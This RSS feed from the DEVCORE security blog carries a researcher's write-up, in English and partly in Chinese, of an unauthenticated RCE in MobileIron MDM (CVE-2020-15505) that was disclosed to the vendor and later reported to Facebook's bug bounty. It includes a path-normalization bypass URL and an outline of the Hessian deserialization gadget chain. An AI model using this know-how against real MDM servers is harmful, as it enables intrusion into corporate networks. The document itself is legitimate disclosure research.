<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
        <title>DEVCORE 戴夫寇爾</title>
        <description>DEVCORE 戴夫寇爾 - 滲透測試服務、資安教育訓練、資安顧問服務</description>
        <link>https://devco.re</link>
        <lastBuildDate>Sat, 12 Sep 2020 16:19:03 +0800</lastBuildDate>
        <pubDate>Sat, 12 Sep 2020 16:19:03 +0800</pubDate>
        <ttl>1800</ttl>
        <atom:link href="https://devco.re/rss" rel="self" type="application/rss+xml" />


        <item>
                <title>How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hi, it’s a long time since my last article. This new post is about my research this March, which talks about how I found vulnerabilities on a leading Mobile Device Management product and bypassed several limitations to achieve unauthenticated RCE. All the vulnerabilities have been reported to the vendor and got fixed in June. After that, we kept monitoring large corporations to track the overall fixing progress and then found that Facebook didn’t keep up with the patch for more than 2 weeks, so we dropped a shell on Facebook and reported to their Bug Bounty program!&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;http://hitcon.org/2020&quot;&gt;HITCON 2020&lt;/a&gt;. You can check the slides &lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As a Red Teamer, we are always looking for new paths to infiltrate the corporate network from outside. Just like &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;our research in Black Hat USA last year&lt;/a&gt;, we demonstrated how leading SSL VPNs could be hacked and become your Virtual “Public” Network! SSL VPN is trusted to be secure and considered the only way to your private network. But, what if your trusted appliances are insecure?&lt;/p&gt;

&lt;p&gt;Based on this scenario, we would like to explore new attack surfaces on enterprise security, and we get interested in MDM, so this is the article for that!&lt;/p&gt;

&lt;h2 id=&quot;what-is-mdm&quot;&gt;What is MDM?&lt;/h2&gt;

&lt;p&gt;Mobile Device Management, also known as MDM, is an asset assessment system that makes the employees’ &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD&lt;/a&gt; more manageable for enterprises. It was proposed in 2012 in response to the increasing number of tablets and mobile devices. MDM can guarantee that the devices are running under the corporate policy and in a trusted environment. Enterprise could manage assets, install certificates, deploy applications and even lock/wipe devices remotely to prevent data leakage as well.&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) is a newer term relevant to MDM which has a broader definition for managed devices. Following we use MDM to represent similar products!&lt;/p&gt;

&lt;h2 id=&quot;our-target&quot;&gt;Our target&lt;/h2&gt;

&lt;p&gt;MDM, as a centralized system, can manage and control all employees’ devices. It is undoubtedly an ideal asset assessment system for a growing company. Besides, MDM must be reachable publicly to synchronize devices all over the world. A centralized and public-exposing appliance, what could be more appealing to hackers?&lt;/p&gt;

&lt;p&gt;Therefore, we have seen hackers and APT groups abusing MDM these years! Such as phishing victims to make MDM a C&amp;amp;C server of their mobile devices, or even compromising the corporate exposed MDM server to push malicious Trojans to all devices. You can read the report &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Let’s Hide This App&lt;/a&gt; by Cisco Talos team and &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt; by CheckPoint CPR team for more details!&lt;/p&gt;

&lt;p&gt;From previous cases, we know that MDM is a solid target for hackers, and we would like to do research on it. There are several MDM solutions, even famous companies such as Microsoft, IBM and Apple have their own MDM solution. Which one should we start with?&lt;/p&gt;

&lt;p&gt;We have listed known MDM solutions and scanned corresponding patterns all over the Internet. We found that the most prevalent MDMs are VMware AirWatch and MobileIron!&lt;/p&gt;

&lt;p&gt;So, why did we choose MobileIron as our target? According to their official website, more than 20,000 enterprises chose MobileIron as their MDM solution, and most of our customers are using that as well. We also know Facebook has exposed the MobileIron server &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;since 2016&lt;/a&gt;. We have analyzed Fortune Global 500 as well, and found more than 15% using and exposing their MobileIron server to the public! Due to above reasons, it became our main target!&lt;/p&gt;

&lt;h2 id=&quot;where-to-start&quot;&gt;Where to Start&lt;/h2&gt;

&lt;p&gt;From &lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;past vulnerabilities&lt;/a&gt;, we learned there aren’t too many researchers diving into MobileIron. Perhaps the attack vector is still unknown. But we suspect the main reason is that the firmware is too hard to obtain. When researching an appliance, turning a pure BlackBox testing into GrayBox, or WhiteBox testing is vital. We spent lots of time searching for all kinds of information on the Internet, and ended up with an RPM package. This RPM file is supposed to be the developer’s testing package. The file is just sitting on a listable WebRoot and indexed by Google Search.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anyway, we got a file to research. The released date of the file is in early 2018. It seems a little bit old but still better than nothing!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. We have informed MobileIron and the sensitive files has been removed now.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;finding-vulnerabilities&quot;&gt;Finding Vulnerabilities&lt;/h2&gt;

&lt;p&gt;After a painful time solving the dependency hell, we set the testing package up finally. The component is based on Java and exposed three ports:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;443 - the user enrollment interface&lt;/li&gt;
  &lt;li&gt;8443 - the appliance management interface&lt;/li&gt;
  &lt;li&gt;9997 - the MobileIron device synchronization protocol (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All opened ports are TLS-encrypted. Apache is in the front of the web part and proxies all connections to backend, a Tomcat with Spring MVC inside.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Due to the Spring MVC, it’s hard to find traditional vulnerabilities like SQL Injection or XSS from a single view. Therefore, examining the logic and architecture is our goal this time!&lt;/p&gt;

&lt;p&gt;Talking about the vulnerability, the root cause is straightforward. Tomcat exposed a Web Service that deserializes user input with Hessian format. However, this doesn’t mean we can do everything! The main effort of this article is to solve that, so please see the exploitation below.&lt;/p&gt;

&lt;p&gt;Although we know the Web Service deserializes the user input, we can not trigger it. The endpoint is located on both:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User enrollment interface - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Management interface - &lt;code class=&quot;highlighter-rouge&quot;&gt;https://mobileiron:8443/mics/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can only touch the deserialization through the management interface because the user interface blocks the Web Service access. It’s a critical hit for us because most enterprises won’t expose their management interface to the Internet, and a management-only vulnerability is not useful to us so that we have to try harder. :(&lt;/p&gt;

&lt;p&gt;Scrutinizing the architecture, we found Apache blocks our access through Rewrite Rules. It looks good, right?&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;MobileIron relied on Apache Rewrite Rules to block all the access to Web Service. It’s in the front of a reverse-proxy architecture, and the backend is a Java-based web server.&lt;/p&gt;

&lt;p&gt;Have you recalled something?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Yes, the &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! It’s the reverse proxy attack surface I &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;proposed in 2015&lt;/a&gt;, and presented at &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt;. This technique leverage the inconsistency between the Apache and Tomcat to bypass the ACL control and reaccess the Web Service. BTW, this excellent technique is also applied to the recently &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;F5 BIG-IP TMUI RCE vulnerability&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploiting-vulnerabilities&quot;&gt;Exploiting Vulnerabilities&lt;/h2&gt;

&lt;p&gt;OK, now we have access to the deserialization wherever it’s on enrollment interface or management interface. Let’s go back to exploitations!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; has an awesome research which summarized the Hessian deserialization vulnerability on his whitepaper, &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt;. From the &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; source code, we learn the Hessian deserialization triggers the &lt;code class=&quot;highlighter-rouge&quot;&gt;equals()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; while reconstructing a &lt;code class=&quot;highlighter-rouge&quot;&gt;HashMap&lt;/code&gt;. It could also trigger the &lt;code class=&quot;highlighter-rouge&quot;&gt;toString()&lt;/code&gt; through the &lt;code class=&quot;highlighter-rouge&quot;&gt;XString&lt;/code&gt;, and the known exploit gadgets so far are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In our environment, we could only trigger the Spring AOP gadget chain and get a JNDI Injection.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;√&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI Injection&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Once we have a JNDI Injection, the rest parts of exploitations are easy! We can just leverage &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt;’s work, &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt;, from Black Hat USA 2016 to get the code execution… Is that true?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Since &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; introduced this on Black Hat, we could say that this technique helps countless security researchers and brings Java deserialization vulnerability into a new era. However, Java finally mitigated the last JNDI/LDAP puzzle in &lt;a href=&quot;https://www.oracle.com/java/technologies/javase/8u181-relnotes.html&quot;&gt;October 2018&lt;/a&gt;. After that, all java version higher than 8u181, 7u191, and 6u201 can no longer get code execution through JNDI remote URL-Class loading. Therefore, if we exploit the Hessian deserialization on the latest MobileIron, we must face this problem!&lt;/p&gt;

&lt;p&gt;Java changed the default value of &lt;code class=&quot;highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; to prevent attackers from downloading remote URL-Class to get code executions. But only this has been prohibited. We can still manipulate the JNDI and redirect the Naming Reference to a local Java Class!&lt;/p&gt;

&lt;p&gt;The concept is a little bit similar to &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt;, utilizing a local existing Java Class to do further exploitations. You can refer to the article &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; in early 2019 for details. It describes the attack on POST-JNDI exploitations and how to abuse the Tomcat’s &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; to populate the &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; gadget to get code execution. Based on this concept, researcher &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; also provides another &lt;code class=&quot;highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; gadget on Groovy. As described in &lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;his (Chinese) article&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;除了 javax.el.ELProcessor，当然也还有很多其他的类符合条件可以作为 beanClass 注入到 BeanFactory 中实现利用。举个例子，如果目标机器 classpath 中有 groovy 的库，则可以结合之前 Orange 师傅发过的 &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins 的漏洞实现利用&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;It seems the Meta Programming exploitation in my previous Jenkins research could be used here as well. It makes the Meta Programming great again :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The approach is fantastic and looks feasible for us. But both gadgets &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; are unavailable due to our outdated target libraries. Tomcat introduced the &lt;code class=&quot;highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; since 8.5, but our target is 7. As for the Groovy gadget, the target Groovy version is too old (1.5.6 from 2008) to support the Meta Programming, so we still have to find a new gadget by ourselves. We found a new gadget on &lt;code class=&quot;highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; in the end. If you are interested, you can check the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt; I sent to the &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; project!&lt;/p&gt;

&lt;h2 id=&quot;attacking-facebook&quot;&gt;Attacking Facebook&lt;/h2&gt;

&lt;p&gt;Now we have a perfect RCE by chaining JNDI Injection, Tomcat &lt;code class=&quot;highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt;. It’s time to hack Facebook!&lt;/p&gt;

&lt;p&gt;Aforementioned, we knew the Facebook uses MobileIron since 2016. Although the server’s index responses 403 Forbidden now, the Web Service is still accessible!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Everything is ready and wait for our exploit! However, several days before our scheduled attack, we realized that there is a critical problem in our exploit. From &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;our last time popping shell on Facebook&lt;/a&gt;, we noticed it blocks outbound connections due to security concerns. The outbound connection is vital for JNDI Injection because the idea is to make victims connecting to a malicious server to do further exploitations. But now, we can’t even make an outbound connection, not to mention others.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;So far, all attack surfaces on JNDI Injection have been closed, we have no choice but to return to Hessian deserialization. But due to the lack of available gadgets, we must discover a new one by ourselves!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before discovering a new gadget, we have to understand the existing gadgets’ root cause properly. After re-reading Moritz Bechler’s &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;paper&lt;/a&gt;, a certain word interested me:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovy’s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;A question quickly came up in my mind: Why did the author leave this word here? Although it failed with exceptions, there must have been something special so that the author write this down.&lt;/p&gt;

&lt;p&gt;Our target is running with a very old Groovy, so we are guessing that the &lt;code class=&quot;highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; constrain might not have been applied to the code base yet! We compared the file &lt;code class=&quot;highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; between the latest and 1.5.6.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Yes, we are right. There is no &lt;code class=&quot;highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; in Groovy 1.5.6, and we later learned &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; is just for that. It’s a mitigation for the rising Java deserialization vulnerability in 2015. Since Groovy is an internally used library, developers won’t update it if there is no emergency. The outdated Groovy could also be a good case study to demonstrated how a harmless component can leave you compromised!&lt;/p&gt;

&lt;p&gt;Of course we got the shell on Facebook in the end. Here is the video:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;vulnerability-report-and-patch&quot;&gt;Vulnerability Report and Patch&lt;/h2&gt;

&lt;p&gt;We have done all the research on March and sent the advisory to MobileIron at 4/3. The MobileIron released the patch on 6/15 and addressed three CVEs for that. You can check the &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;official website&lt;/a&gt; for details!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the patch has been released, we start monitoring the Internet to track the overall fixing progress. Here we check the &lt;code class=&quot;highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; header on static files so that the result is just for your information. (Unknown stands for the server closed both 443 and 8443 ports)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;At the same time, we keep our attentions on Facebook as well. With 15 days no-patch confirm, we finally popped a shell and report to their Bug Bounty program at 7/2!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;So far, we have demonstrated a completely unauthenticated RCE on MobileIron. From how we get the firmware, find the vulnerability, and bypass the JNDI mitigation and network limitation. There are other stories, but due to the time, we have just listed topics here for those who are interested:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;How to take over the employees’ devices from MDM&lt;/li&gt;
  &lt;li&gt;Disassemble the MI Protocol&lt;/li&gt;
  &lt;li&gt;And the CVE-2020-15506, an interesting authentication bypass&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope this article could draw attention to MDM and the importance of enterprise security! Thanks for reading. :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>看我如何再一次駭進 Facebook，一個在 MobileIron MDM 上的遠端程式碼執行漏洞!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;嗨! 好久不見，這是我在今年年初的研究，講述如何尋找一款知名行動裝置管理產品的漏洞，並繞過層層保護取得遠端程式碼執行的故事! 其中的漏洞經回報後在六月由官方釋出修補程式並緊急通知他們的客戶，而我們也在修補程式釋出 15 天後發現 Facebook 並未及時更新，因此透過漏洞取得伺服器權限並回報給 Facebook!&lt;/p&gt;

&lt;p&gt;此份研究同時發表於 &lt;a href=&quot;https://hitcon.org/2020/&quot;&gt;HITCON 2020&lt;/a&gt;，你可以從&lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;這裡&lt;/a&gt;取得這次演講的投影片!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;身為一個專業的紅隊，我們一直在尋找著更快速可以從外部進入企業內網的最佳途徑! 如同我們去年在 &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; 發表的研究，SSL VPN 理所當然會放在外部網路，成為保護著網路安全、使員工進入內部網路的基礎設施，而當你所信任、並且用來保護你安全的設備不再安全了，你該怎麼辦?&lt;/p&gt;

&lt;p&gt;由此為發想，我們開始尋找著有沒有新的企業網路脆弱點可當成我們紅隊攻擊滲透企業的初始進入點，在調查的過程中我們對 MDM/UEM 開始產生了興趣，而這篇文章就是從此發展出來的研究成果!&lt;/p&gt;

&lt;h2 id=&quot;什麼是-mdmuem-&quot;&gt;什麼是 MDM/UEM ?&lt;/h2&gt;

&lt;p&gt;Mobile Device Management，簡稱 MDM，約是在 2012 年間，個人手機、平板裝置開始興起時，為了使企業更好的管理員工的 &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD 裝置&lt;/a&gt;，應運而生的資產盤點系統，企業可以透過 MDM 產品，管理員工的行動裝置，確保裝置只在信任的環境、政策下運行，也可以從中心的端點伺服器，針對所控制的手機，部署應用程式、安裝憑證甚至遠端操控以管理企業資產，更可以在裝置遺失時，透過 MDM 遠端上鎖，或是抹除整台裝置資料達到企業隱私不外漏的目的!&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) 則為近幾年來更新的一個術語，其核心皆為行動裝置的管理，只是 UEM 一詞包含更廣的裝置定義! 我們以下皆用 MDM 一詞來代指同類產品。&lt;/p&gt;

&lt;h2 id=&quot;我們的目標&quot;&gt;我們的目標&lt;/h2&gt;

